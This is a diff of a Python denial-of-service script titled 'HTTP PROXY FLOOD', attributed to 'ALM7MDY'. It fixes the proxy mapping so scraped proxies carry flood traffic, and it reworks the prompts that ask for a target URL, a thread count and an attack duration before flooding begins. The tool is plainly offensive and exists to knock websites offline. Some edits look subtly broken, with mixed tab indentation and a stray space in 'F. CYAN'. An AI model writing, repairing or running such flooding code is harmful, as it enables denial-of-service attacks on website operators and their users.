@@ -24,7 +24,7 @@ __method__ = 'HTTP'
 
 sip = Halo()
 print(f'''
-{F.WHITE} TSD TOOL {F.GREEN} |{F.WHITE} HTTP PROXY FLOOD {F.GREEN} |{F.WHITE} BY ALM7MDY
+{F.WHITE} TSD TOOL {F.GREEN} | {F.WHITE} HTTP PROXY FLOOD {F.GREEN} |{F.WHITE} BY ALM7MDY
 {F.GREEN}
 ▄▄▄█████▓  ██████ ▓█████▄ 
 ▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
@@ -106,7 +106,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
             verify=False,
         ) as proxy_list_socks4:
             proxies_socks4 = [
-                {"socks4": proxy, "socks4": proxy}
+                {"http": proxy, "https": proxy}
                 for proxy in proxy_list_socks4.text.split("\r\n")
                 if proxy != ""
             ]
@@ -225,14 +225,14 @@ def start_flooding(target: str, thread_count: int, duration: int) -> None:
     print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attack finished after {duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
-    target_url = input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
+	target_url = input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}''')
-    num_threads = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
+	num_threads = int(input(f'''\n{F. CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}'''))
-    duration = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
+	duration = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}'''))
-    sleeptime = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Sleep Time{F.CYAN})
+	sleeptime = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Sleep Time{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}'''))
 
-    start_flooding(target_url, num_threads, duration)
+	start_flooding(target_url, num_threads, duration)
 
